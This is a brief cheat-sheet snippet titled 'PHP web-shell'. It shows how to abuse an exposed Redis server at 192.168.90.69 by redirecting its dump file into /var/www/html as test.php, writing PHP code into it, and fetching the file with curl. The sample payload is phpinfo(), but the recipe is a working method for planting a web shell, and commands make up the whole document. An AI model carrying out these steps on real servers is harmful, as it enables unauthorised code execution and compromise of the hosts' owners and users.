# PHP web-shell

```bash
# Connect to the target 
redis-cli -h 192.168.90.69

# Change the directory to /var/www/html
config set dir /var/www/html

config set dbfilename test.php
set test "<?php phpinfo(); ?>"
save 
quit

# Access to the php
curl http://192.168.90.69/test.php
```
